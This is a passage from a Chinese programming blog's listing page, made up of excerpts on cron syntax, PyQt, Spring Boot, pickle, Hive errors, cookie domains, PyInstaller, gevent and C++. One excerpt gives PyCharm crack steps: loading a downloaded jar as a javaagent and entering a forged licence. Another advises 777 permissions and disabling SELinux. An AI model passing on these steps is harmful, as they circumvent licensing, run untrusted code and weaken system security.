序号说明 是否必填 允许填写的值允许的通配符 1 秒 是 0-59 , - * / 2 分 是 0-59 , - * / 3小时 是 0-23 , - * / 4 日 是 1-31 , - * ? / L W 5 月 是 1-12 or JAN-DEC , - * / 6 周 是 1-7 or SUN-SAT , - * ? / L # 7 年 否 empty 或 1970-2099 , - * /
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c74bf9738e66548da10ece0cf2d87651/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58b1814246902c08756d1805ed9427dc/" rel="bookmark">
			thinkphp _STORAGE_WRITE_ERROR_  权限报错解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在linux上部署php项目可能会碰到 _STORAGE_WRITE_ERROR_:./Application/Runtime/
把项目目录设置777权限后还没解决的情况下：
使用命令到项目地址 关闭SELinux
setenforce 0 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b946e88618a12c1e01f4f15dc1e1df47/" rel="bookmark">
			PyQt入门项目(一)：车票信息查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Target:PyQt5+requests实现一个车票查询工具(功能虽然很鸡肋，纯粹当作练手了)
结构图
效果图
思路
1、search(QPushButton)点击信号（clicked）连接到自定义的槽函数（event.search）
2、槽函数（event.search）接收四个参数：QTableWidget对象的引用、两个QLabel中的内容（站台名称）、QDateEdit格式化日期
3、槽函数（event.search）调用爬虫类（TrainService）获取车次信息，添加到QTableWidget对象中。
代码
1、ui.py(ui界面)
# -*- coding: utf-8 -*- # Form implementation generated from reading ui file 'E:\Python\Qt\ui_0.ui' # # Created by: PyQt5 UI code generator 5.11.2 # # WARNING! All changes made in this file will be lost! from PyQt5 import QtCore, QtGui, QtWidgets from Event import EventClass class Ui_MainWindow(object): def setupUi(self, MainWindow): event=EventClass() MainWindow.setObjectName("MainWindow") MainWindow.resize(793, 604) MainWindow.setStyleSheet("font: 10pt \"Microsoft YaHei UI\";") self.centralwidget = QtWidgets.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b946e88618a12c1e01f4f15dc1e1df47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5f42d12ee408764644c247fba376a17/" rel="bookmark">
			Spring Boot中引入Jpa和Thymeleaf
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JPA是Java Persistence API的简称，中文名Java持久层API，是JDK 5.0注解或XML描述对象－关系表的映射关系，并将运行期的实体对象持久化到数据库中。
JPA展示如何将Plain Oriented Java Object(POJO)定义为entity，以及如何管理entity之间的关系。
Thymeleaf is a Java library. It is an XML/XHTML/HTML5 template engine able to apply a set of transformations to template files in order to display data and/or text produced by your applications.
简单说， Thymeleaf 是一个跟 Velocity、FreeMarker 类似的模板引擎，它可以完全替代 JSP
1、配置 pom.xml
&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; application.properties
spring.datasource.driverClassName=oracle.jdbc.driver.OracleDriver
spring.datasource.url=jdbc:oracle:thin:@10.xx.xx.37:1521:xe
spring.datasource.username=orcl
spring.datasource.password=orcl
#模板编码 spring.thymeleaf.mode=LEGACYHTML5 #关闭thymeleaf缓存 开发时使用 否则没有实时画面 spring.thymeleaf.cache=false 如果配置LEGACYHTML5，则需要引入nekohtml
本次代码没有application.properties配置
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5f42d12ee408764644c247fba376a17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88684b6c617d001e184ffeeb1d3109f3/" rel="bookmark">
			Python中 pickle 模块的 dump() 和 load() 方法详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 概述 Python中的 pickle 模块实现了基本的数据序列与反序列化。
序列化对象可以在磁盘上保存对象，并在需要的时候读取出来。
任何对象都可以执行序列化操作。
2. dump()方法 2.1 用法 pickle.dump(obj, file, protocol)
注释：
obj——序列化对象，将对象obj保存到文件file中去；
file——file表示保存到的类文件对象，file必须有write()接口，file可以是一个以’w’打开的文件或者是一个StringIO对象，也可以是任何可以实现write()接口的对象；
protocol——序列化模式，默认是 0（ASCII协议，表示以文本的形式进行序列化），protocol的值还可以是1和2（1和2表示以二进制的形式进行序列化。其中，1是老式的二进制协议；2是新二进制协议）。
2.2 示例 #!/usr/bin/env python3 # -*- coding: utf-8 -*- # @Time : 2019/1/15 10:11 # @Author : Arrow and Bullet # @FileName: dump_load.py # @Software: PyCharm # @Blog ：https://blog.csdn.net/qq_41800366 import pickle fw = open("pickleFileName.txt", "wb") pickle.dump("try", fw) 保存在文件中的结果如下：
3. load()方法 3.1 用法 pickle.load(file)
注释：
反序列化对象，将文件中的数据解析为一个python对象。
file中有read()接口和 readline() 接口
3.2 示例 import pickle fr = open("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/88684b6c617d001e184ffeeb1d3109f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89464eb192a2822101a3bad5e5a90625/" rel="bookmark">
			[转]BT1120接口及协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文地址：https://blog.csdn.net/angelbosj/article/details/49835105
因为项目上用到的是 海思3536的bt1120接口对接 FPGA。项目上用到的是 1920 x 1080@60Hz. 和 3840 x 2160@30hz.
首先讲一下 1920X1080@60HZ,这里走bt1120接口，走的是单边沿。下面 具体讲一下。
上图看到， BT1120的接口 有 16根 数据线 和 一根 时钟线。
下面说一下接口的时序及说明。
对于一帧视频图像，有视频帧消隐区和 行消隐区。这些概念首先得明白，才能往下看。
上图我们看到视频中的某一帧的状态。L1 和 L2 是帧消隐区， 同样 L5 和 L6也是帧消隐区。我们看看下图，来说明各个参数的意义。
从上图我们看到了再 L3 和 L4行之间才是真正的有用的 1080行视频数据。
下面我们看看每行的数据的格式：
和
由上面的格式， 我们可以看到每一行在视频传输过程中的格式。在定时基准码的前 3个字节是恒定的。 FF , 00 , 00, 第四个字节 XY是我们需要分析的。我们再好好分析下,EAV和SAV 应该填的数据。
通过以上几个图片，就应该可以知道 EAV 和 SAV可以填什么数据了。也知道 BT1120每行的数据格式。
至于 3840 x 2160@30hz走的是 BT1120的双边沿。
格式是
这里 XY的值 和 单边沿是一样的。只是速率提高了一倍。这样就可以通过 BT1120传输 4k的视频。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c5b4a6fdc9a46b44bf167fe53348f28/" rel="bookmark">
			信源编码的三种方式与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		信源编码的三种方式与实现 一、本文概述二、编码原理1. 哈夫曼编码2. 算术编码3. LZ编码 三、算法设计思路1. 哈夫曼编码a. 设置功能结构体和函数b. 压缩文件初始化统计表频度读入文件并统计频度对统计表频度排序建立哈夫曼树进行编码写文件 c. 解压文件 2. 算数编码3. LZ-78编码a. 设计功能类b. 主程序调用测试c. 功能类函数实现1. 函数 lz_compress2. 函数 lz_decompress3. 函数 IfStringInDic 和 函数 FindPreString4. 优化 四、实验拓展与编码操作五、编码结果与性能分析1. 哈夫曼编码2. LZ-78编码3. 算数编码 六、问题总结与体会 一、本文概述 这是第一次在CSDN上写blog，想写很久了，一直因为忙耽搁了，放假了，打算整理一下这学期的一些代码和实验写blog。
本文主要根据我信息论课程的信源编码大作业报告所写，相关代码放在我的GitHub上，初次在CSDN发blog，小小紧张哈哈哈。
本文主要实现了哈夫曼编码，且性能较为优秀。另外还拓展实现了LZ编码和算数编码，并在将哈夫曼和LZ-78两种编码方式的cpp文件通过统一的main.cpp文件整合在一起，可以通过运行project来选择希望的编码方式对目标文件进行编码。
另外，本文的实验中，也出现了一些编译器的问题，例如Visual Studio下和Mac下存在着一定的优劣对比。
本文中给出了一些实现的部分代码，完整代码见GitHub：
https://github.com/YZ-WANG/Three-methods-for-source-encoding
二、编码原理 本文的实验实现了三种编码方式：哈夫曼编码、LZ编码和算数编码。下面分析其各自基本原理。
1. 哈夫曼编码 哈夫曼编码是是一种可变长的分组编码，完全依据各字符出现的概率来构造码字。二进制的哈夫曼编码是基于二叉树的编码思想，所有可能的输入符号在哈夫曼树上对应为一个节点，结点的位置就是该符号的哈夫曼编码。为了构造出唯一可译码，这些节点都是哈夫曼树上的终极结点（即叶子结点），不再延伸，不会出现前缀码。具体编码方法如下：
将信源消息符号按其出现的概率大小依次排列为 p1≥p2≥…≥Pn；取两个概率最小的字母分别配以 0 和 1 两个码元，并将这两个概率相加作为一个新字母的概率，与未分配二进制符号的字母一起重新排队；对重排后的两个概率最小符号重复步骤2的过程；不断继续上述过程，直到最后两个符号配以 0 和 1 为止；从最后一级开始，向前返回得到各个信源符号所对应的码元序列，即为相应码字。 特别地，有时为了得到最短平均码长，尽量减少赋长码的信源符号，需要在编码前对信源符号作添加，使得信源的符号数量满足 M(N-1)+1，其中M为正整数，N为进制，这样在多次合并后就能充分利用短码，以便降低平均码长。
此外，哈夫曼编码方法所得到的码并非是唯一的，造成非唯一的原因如下：
每次对信源缩减时，赋予信源最后两个概率最小的符号，用0和1是可以任意的，所以可以得到不同的哈夫曼编码，但不会影响码字的长度。对信源进行缩减时，两个概率最小的符号合并后的概率与其他信源符号的概率相同时，这两者在缩减信源中进行概率排序，其位置放置次序可以是任意的，故会得到不同的哈夫曼码。此时将影响码字的长度，一般将合并的概率放在上面，这样可以得到较小的码方差。 哈夫曼编码的特点：
哈夫曼码的编码方法保证了概率大的符号对应于短码，概率小的符号对应于长码，充分利用了短码；而是缩减信源的最后二个码字总是最后一位不同，从而保证了哈夫曼码是即时码。 哈夫曼码的编码效率是非常高的，它可以单个信源符号编码或用L较小的信源序列编码，对编码器的设计来说也将简单得多。但是应当注意，要达到很高的效率仍然需要按长序列来计算，这样才能使平均码字长度降低。
哈夫曼编码的解码则在识别出一个个叶子结点后按照叶子结点对应的原信源符号译码。
哈夫曼编码虽然效率出众，但仍然存在一些分组码所具有但缺点。例如概率特性必须精确测定，以此来编织码表，若略有变化，还需要更换码表。故实际编码过程中需要对原始数据扫描两遍，第一遍用来统计原始数据中各字符出现的概率，创建码表存放起来，第二遍则依据码表在扫描的同时进行编码，才能传输信息。如果将这种编码放在网络通信中，两遍扫描会引起较大的时延；如果用于数据压缩，则会降低速度。因此，出现了自适应哈夫曼编码方法，其码表不是实现构造，而是随着编码的进行，不断动态构造、调整。
2. 算术编码 由于在使用分组码对信源单符号进行编码时，没有将符号间的相关性纳入考虑之中：若将m个符号合起来进行编码则会增加设备复杂度，且组间符号的相关性还是无法纳入考虑。这就使得信源编码的匹配原则不能充分满足，编码效率有所损失。
为了克服这种局限性，一种基于非分组码的编码方法——算数编码应运而生。编码的基本思路是：将需要编码的全部数据看成某一 L L L 长序列，所有可能出现的L长序列的概率映射到 [ 0 , 1 ] [0,1] [0,1] 的区间上，把 [ 0 , 1 ] [0,1] [0,1] 区间分成许多小段，每段长度等于某一序列的概率。再在段内取一个二进制小数用作码字，其长度可与该序列的概率匹配，达到高效率编码的目的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c5b4a6fdc9a46b44bf167fe53348f28/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44ad48b3a037f6009e68ea1c886f7c69/" rel="bookmark">
			Hive中运行任务报错：FAILED: Execution Error, return code 1 from org.apache.hadoop.hive.ql.exec.mr.MapRedTask
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 错误 FAILED: Execution Error, return code 1 from org.apache.hadoop.hive.ql.exec.mr.MapRedTask 二 错误原因 第一种，yarn资源不足 原因：
该错误是YARN的虚拟内存计算方式导致，上例中用户程序申请的内存为1Gb，YARN根据此值乘以一个比例（默认为2.1）得出申请的虚拟内存的值，当YARN计算的用户程序所需虚拟内存值大于计算出来的值时，就会报出以上错误。调节比例值可以解决该问题。具体参数为：yarn-site.xml中的yarn.nodemanager.vmem-pmem-ratio
解决方法：
调整hadoop配置文件yarn-site.xml中值： &lt;property&gt; &lt;name&gt;yarn.scheduler.minimum-allocation-mb&lt;/name&gt; &lt;value&gt;2048&lt;/value&gt; &lt;description&gt;default value is 1024&lt;/description&gt; &lt;/property&gt; 本人亲测：
增加yarn.scheduler.minimum-allocation-mb 数量，从缺省1024改为2048；上述运行问题即刻得到解决
第二种，仔细检查自己的代码 自己的hql语句写错也会出现此问题！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e6dd58025d8d941009ad429bcaaa29a/" rel="bookmark">
			Barefoot Networks 宣布 P4 Studio—下一代软件开发环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Barefoot Networks 宣布 P4 Studio—下一代软件开发环境
下载地址： https://barefootnetworks.com/products/brief-p4-studio/
2018年欧洲开放网络峰会;阿姆斯特丹——2018年9月25日，高性能和完全可编程网络解决方案提供商Barefoot Networks今天宣布推出Barefoot P4 Studio，这下一代软件开发环境（SDE）用于开发Barefoot Tofino™系列P4可编程专用集成电路（ASIC）的强大功能。 Barefoot P4 Studio通过简化P4应用程序的开发，调试和优化，实现与网络操作系统控制和管理平面的集成，从而加速了可编程转发平台的应用。借助Barefoot P4 Studio，用户可以获得强大的模块化基础架构，P4应用程序，简化的API集和数据平面可视化工具。
“随着Tofino在市场的快速发展，对于客户来说同时开发标准和新功能并大规模部署它们的速度是至关重要的，”Barefoot Networks首席执行官Craig Barratt说。“通过我们的Barefoot P4 Studio软件开发环境，我们使Tofino的所有用户能够无缝地开发出高效，高质量的交换机系统，可用于构建可扩展的未来网络。”
由于网络流量的不断增加和用户对新的差异化服务的需求，Barefoot P4 Studio为开发人员提供了构建高效和可扩展的网络系统所需的工具。 新产品提供了一整套工具，包括：
Barefoot P4编译器 - 凭借多年的可编程网络经验，Barefoot推出了下一代P4编译器，它能显著提高编译速度，增强自动调试功能，并且该编译器也支持P4-14和P4-16版本。 随着P4-16语言引出了目标体系结构的概念，Tofino Native Architecture（TNA）规范被提出，并且该规范支持不同的用例。Barefoot目标仿真模型 - Barefoot当前和未来ASIC的软件寄存器精确模型，在P4应用程序部署到真实硬件之前允许开发人员能够快速设计出P4应用程序雏形。Barefoot P4 Insight™ - 基于Web的动态数据平面可视化工具，可让开发人员了解如何在硬件中布置P4程序，并允许他们优化这些程序以获得最大的可扩展性。Barefoot运行时接口（BRI） -BRI是一个流线型的、与P4程序无关的API，它以一种可扩展的方式实现控制平面和转发平面之间的通信。 通过控制平面或系统供应商硬件抽象层配置Barefoot ASIC的所有区域。特别的，它是支持ONF的Stratum交换机操作系统和P4 Runtime的基础。Barefoot模型驱动抽象接口（BMAI） - 一种新的基础架构，使开发人员能够自由创建更高级的P4抽象类,声明类对象，并自动生成API，这些API可以被控制平面用来配置这些对象。Barefoot P4应用程序 - 支持以模块化和可重复使用的方式编写功能丰富的P4交换机应用程序，并与BMAI框架完全集成。 这种集成使开发人员能够轻松扩展这些P4应用程序，并使P4程序的所有部分都由相同的抽象API进行配置。Barefoot数据包测试框架 - 基于Python的测试框架，在所有的API（包括BRI，BMAI和SAI）验证P4应用程序的功能。Barefoot统一设备驱动程序 - 支持所有当前和未来Barefoot ASIC的单一设备驱动程序。 Tofino是世界上第一个可编程以太网交换机ASIC，它是使用协议无关的交换机体系结构（PISA）来建立的。目前正在与多个客户进行试验，Barefoot P4 Studio是一个单一的SDE，支持所有当前和未来的Barefoot ASIC以及各种用例，而这些用例也会需要不同的ASIC配置。
行业支持 Barefoot Networks很高兴地展示了传统设备制造商，云运营商，电信运营商和生态系统合作伙伴对新功能的广泛采用和支持。
“经过多年的努力，我们将于10月发布业界首款可编程数据中心架构，以实现全面可用性。 它是一种全自动化结构，专为白盒设计，带有标准P4编写的数据平面。 该解决方案允许客户自行创新，引入新的服务和功能，而无需芯片升级。 基于Boffoot Tofino的可编程交换机对于提供我们的网络切片和自动化功能至关重要，“Kaloom首席执行官Laurent Marchand说。 “作为P4开发人员，我们期待利用Barefoot P4 Studio与P4 Compiler和P4 Insight加速我们的数据平面开发。”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e6dd58025d8d941009ad429bcaaa29a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7302062b025041665141eb40583555bf/" rel="bookmark">
			cookie设置域名问题，cookie跨域
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天研究一天发现cookie无法设置除当前域名或者其父域名之外的其他domain.
这个是浏览器出于对cookie的保护造成的，也就是cookie无法跨域设置。
对于子域名也有如下规则，当前域名只能设置当前域名以及他的父域名，不能设置子域名
如在www.wo.cao.baidu.com 域名下只能设置 cao.baidu.com,baidu.com
不能设置 da.jia.wo.cao.baidu.com的cookie。
一篇文章还不错，摘录下来
当我们给网站设置cookie时，大家有没有发现在网站的其他域名下也接收到了这些cookie。这些没用的cookie看似不占多少流量，但如果对一个日PV千万的站点来说，那浪费的资源就不是一点点了。因此在设置cookie时，对它的作用域一定要设置准确了。
我们都知道在PHP中用setcookie 来设置网站的cookie，该函数的用法如下：
bool setcookie ( string $name [, string $value [, int$expire = 0 [, string$path [, string $domain [, bool$secure = false [, bool$httponly = false ]]]]]] )
今天我们就来探讨一下它的第五个参数$domain，因为它决定了cookie的作用域。
现在有如下3个域名，一个顶级域名、一个二级域名和一个三级域名：
① zydya.com
②blog.zyday.com
③one.blog.zyday.com
首先在①zyday.com域名下设置cookie，做四次测试，分别设置domain参数为空、'zyday.com'、'blog.zyday.com'与'one.blog.zyday.com'。
√表示该域名下能取到cookie，×表示不能取到cookie domain参数zydya.comblog.zyday.comone.blog.zyday.comsetcookie('name',1,time()+1) √ √ √setcookie('name',1,time()+1,'/','zyday.com') √ √ √setcookie('name',1,time()
+1,'/','blog.zyday.com') × × ×setcookie('name',1,time()
+1,'/','one.blog.zyday.com')××× 当domain设置为空时，domain默认为当前域名，并且该域名下的子域名都可以接收到cookie。
但是domain参数设置其子域名时，所有域名就接收不到了，包括那个子域名。
然后在②blog.zyday.com域名下设置cookie，测试条件同上 domain参数zydya.comblog.zyday.comone.blog.zyday.comsetcookie('name',1,time()
+1)×√√setcookie('name',1,time()+1,'/','zyday.com')√√√setcookie('name',1,time()+1,'/','blog.zyday.com')×√√setcookie('name',1,time()+1,'/',one.blog.zyday.com')××× 看第二行，domain参数是zyday.com，是blog.zyday.com的父域名，那么zyday.com下所有子域名(包括zyday.com、blog.zyday.com、one.blog.zyday.com)都能接收到cookie。
当domain为自身域名时，那么其父域名受影响，其本身与其子域名可以接收到cookie。
而设置其子域名或其他域名时，所有域名都接收不到cookie了。
最后在③one.blog.zyday.com域名下设置cookie domain参数zydya.comblog.zyday.comone.blog.zyday.comsetcookie('name',1,time()
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7302062b025041665141eb40583555bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5bffc6c7c2a03fb0ca3de7256ae7697e/" rel="bookmark">
			pyinstaller 打包程序的相对路径问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pyinstaller 打包py文件成exe文件，在没有python的机器上运行，执行打包后的程序，经常会出现程序使用的图标无法显示，程序使用的关联文件无法关联。或者，在打包的本机上运行正常，但是将打包后的程序放到其它机器上就有问题。这些现象都很有可能是由程序使用的文件路径发生改变产生的，因此在打包时候我们需要根据执行路径进行路径“冻结”。
1.使用绝对路径
在python代码中使用绝对路径调用外部文件可以保证打包时候路径可追溯，因此在本机上运行打包后程序基本没问题。但是当本机上对应路径的资源文件被改变，或者将打包程序应用到别的机器，都会出现搜索不到资源文件的问题。这种方式不是合适的打包发布python软件的方式。
2.使用冻结路径
增加一个py文件，例如叫
frozen_dir.py
--------------------------------------------------------------------------------------------------------------
# -*- coding: utf-8 -*-
import sys
import os
def app_path():
"""Returns the base application path."""
if hasattr(sys, 'frozen'):
# Handles PyInstaller
return os.path.dirname(sys.executable) #使用pyinstaller打包后的exe目录
return os.path.dirname(__file__) #没打包前的py目录
-----------------------------------------------------------------------------------------------------------------
其中的app_path()函数返回一个程序的执行路径，为了方便我们将此文件放在项目文件的根目录，通过这种方式建立了相对路径的关系。
源代码中使用路径时，以app_path()的返回值作为基准路径，其它路径都是其相对路径。以本文中使用的python项目打包为例，如下所示
test.py
---------------------------------------------------------------------------------------------------
# -*- codling: utf-8 -*- import os import frozen_dir def savelog(file,log): dirname = os.path.dirname(file) if not os.path.exists(dirname): os.mkdir(dirname) with open(file,'a',encoding='utf-8') as f: f.write(log+'\n') if __name__=='__main__': file = frozen_dir.app_path()+r'\log\2.txt' print(file) savelog(file,'hello you') savelog(file,'文件路径%s' %(file)) -------------------------------------------------------------------------------------------------------
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5bffc6c7c2a03fb0ca3de7256ae7697e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/adfd20a315c214598a39b6601ddc3f75/" rel="bookmark">
			038-2018-1030 gevent IO多路复用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		笔记
昨日内容回顾:
线程的一些其他方法
事件
队列 : queue.Queue先进先出 先进后出 优先级的队列
线程池: map submit result shutdown(close+join) add_done_callback
GIL锁 :
协程:单线程下实现并发
什么并发
并行
串行
今天的内容
协程:gevent模块,遇到IO自动切换任务
给大家看一个线程下(也就是协程)来实现多个客户端聊天
IO多路复用:模型(解决问题的方案)
同步:一个任务提交以后,等待任务执行结束,才能继续下一个任务
异步:不需要等待任务执行结束,
阻塞:IO阻塞,程序卡住了
非阻塞:不阻塞
作业
阻塞IO模型实现socket通信
Select IO多路复用实现以下socket通信
明日预习内容
https://www.cnblogs.com/clschao/articles/9712056.html
明日默写:
GIL锁
线程池中的几种方法,每个方法干什么用的写一下
作业:
1 通过线程池写一个并发的爬虫的程序,需要应用回调函数
2 自行完成一个简单的socketserver,使用面向对象+多线程来实现
gevent使用
import gevent from gevent import monkey monkey.patch_all() import time def eat(name): print('%s eat 1' %name) # gevent.sleep(2) time.sleep(2) print('%s eat 2' %name) def play(name): print('%s play 1' %name) # gevent.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/adfd20a315c214598a39b6601ddc3f75/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0b4306e66f5d1ca4f004c4339299026/" rel="bookmark">
			破解PyChrarm
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 破解补丁激活 下载 https://pan.baidu.com/s/1mcQM8CLUnweY02ahKEr4PQ 并将 JetbrainsCrack-release-enc.jar 放置到 pycharm安装目录的\bin目录下（位置可随意，只要配置文件填写相对应的路径）。
在 Pycharm安装目录的\bin目录下找到 pycharm.exe.vmoptions 和 pycharm64.exe.vmoptions ，以文本格式打开并同时在两个文件最后追加 -javaagent:D:\你pycharm的安装路径\bin\JetbrainsCrack-release-enc.jar，注意路径修改成你的pycharm安装路径，然后保存。
启动Pycharm ,选择激活码激活，输入如下内容激活
​ ThisCrackLicenseId-{"licenseId":"11011","licenseeName":"WeChat","assigneeName":"IT--Pig","assigneeEmail":"1113449881@qq.com","licenseRestriction":"","checkConcurrentUse":false,"products":[{"code":"II","paidUpTo":"2099-12-31"},{"code":"DM","paidUpTo":"2099-12-31"},{"code":"AC","paidUpTo":"2099-12-31"},{"code":"RS0","paidUpTo":"2099-12-31"},{"code":"WS","paidUpTo":"2099-12-31"},{"code":"DPN","paidUpTo":"2099-12-31"},{"code":"RC","paidUpTo":"2099-12-31"},{"code":"PS","paidUpTo":"2099-12-31"},{"code":"DC","paidUpTo":"2099-12-31"},{"code":"RM","paidUpTo":"2099-12-31"},{"code":"CL","paidUpTo":"2099-12-31"},{"code":"PC","paidUpTo":"2099-12-31"}],"hash":"2911276/0","gracePeriodDays":7,"autoProlongated":false}​ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7138f59737778acf02a51c5a9d846268/" rel="bookmark">
			如何用VBA实现格式刷的功能？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.
http://club.excelhome.net/thread-373686-1-1.html
复制1格式Selection.CopyFormat
粘贴格式Selection.PasteFormat
2.
http://www.excelpx.com/thread-116445-1-1.html
Sub Macro1() Dim Rng As Range Set Rng = ActiveCell Rng.Copy ActiveSheet.UsedRange.PasteSpecial Paste:=xlPasteFormats, Operation:=xlNone, _ SkipBlanks:=False, Transpose:=False Application.CutCopyMode = False Rng.Select End Sub 有效！
操作：先用鼠标选择源单元格 --- 再运行上述代码 进行全部格式化
3.
http://www.excelpx.com/thread-139764-1-1.html
Set QY1 = Sheet1.Cells(I, 1).Resize(1, 7) Set qy2 = Sheet2.Cells(I + 1, 10).Resize(1, 7) QY1.Copy qy2.PasteSpecial Paste:=xlPasteFormats, Operation:=xlNone, _ SkipBlanks:=False, Transpose:=False Application.CutCopyMode = False VBA粘贴
转载于:https://www.cnblogs.com/onelikeone/p/10264004.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad4887c2cad6d41f1b4b3e012a603d7a/" rel="bookmark">
			Microsoft Office 无法找到此应用程序的许可证，修复尝试失败或者已被取消
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 小编最近遇到了这么个问题，OneNote打开的时候突然开始报错了，错误信息如下：Microsoft Office 无法找到此应用程序的许可证，修复尝试失败或者已被取消。Microsoft Office 现在将退出 ，看到这个问题，小编也是一脸懵逼，因为之前还好好的，突然就来了这么一个问题，导致自己的笔记和记录不能看了，没办法，解决一下吧。错误的截图如下：
不管怎么整，反正就是陷入了一个循环，循环的退出，确认，重启OneNote，退出，重启。。。。
小编就去百度了一些解决方案，但是发现并不奏效，或者小编也没有他们那种类似的操作，最后小编看到了一个文章上面的思路，说有可能是360或者电脑管家的进程优化或者查杀出的问题，然后联想一下小编确实是进行了进程优化，有可能是这个问题，重启下电脑，试一试吧。
果然，重启了电脑以后，OneNote打开就没有问题，问题果然出在了360上，所以以后查杀的时候还是要留意一下Office相关的东西。
总结 我们身边的这些工具确实很便利，但是也难免会出现问题，正所谓工欲善其事，必先利其器，想要用这些工具提高效率还有对这些工具有一定的了解才行，以后查杀进程要注意一些才行，本篇博客到此结束，希望对您有所帮助。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5dae4d103758decb96da224b8be0ffd0/" rel="bookmark">
			c&#43;&#43;类和对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先，明白c++和C语言的区别：
C语言面向过程，c++面向对象；面向过程：即我们着力于项目的每个过程动作，实现每一个动作方法，分析出求解问题的步骤，通过函数调用逐步解决问题；面向对象：即着力于对象，从对象个体出发，看对象的需求，将一件事情拆分成不同的对象，靠对象之间的交互完成；由于c++面向对象的特点，类和对象就由此产生；类：是抽象的一个类别；对象：是类的实例化，相当于现实世界的实体； 类的实现：
将C语言中的struct进行延伸，c++中的struct可用来实现类；即可在struct内定义变量和函数； struct Student { void SetStudentInfo(const string name, const string gender, int age) { strcpy(name, name); strcpy(gender, gender); age = age; } void PrintStudentInfo() { cout&lt;&lt;name&lt;&lt;" "&lt;&lt;gender&lt;&lt;" "&lt;&lt;age&lt;&lt;endl; } string name; string gender; int age; }; 在c++中我们常用class来定义类 class Student { void SetStudent(const char* name, const char* gender, int age) { strcpy(_name, name); strcpy(_gender, gender); _age = age; } void PrintStudent() { cout&lt;&lt;_name&lt;&lt;" "&lt;&lt;_gender&lt;&lt;" "&lt;&lt;_age&lt;&lt;endl; } char _name[20]; char _gender[3]; int _age; }; 类的访问限定符：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5dae4d103758decb96da224b8be0ffd0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5abda84366917b078609eed3db78cf9/" rel="bookmark">
			Function的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		定义函数的基本方法： 1，函数声明：
function fun1(){
}
2，函数表达式：
var fun2 =function (){
}
3，Function:
var fun3 = new Function(){
}
Function 可以用来新建函数对象： 语法： 1，如果不传参，创建的就是一个空的函数
//var 函数名 = new Function()
2，如果只传一个参数，这个参数就是函数体
//var 函数名 = new Function("函数体")
3，如果传多个参数，最后一个参数为函数体，前面的参数都是该函数的形参
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
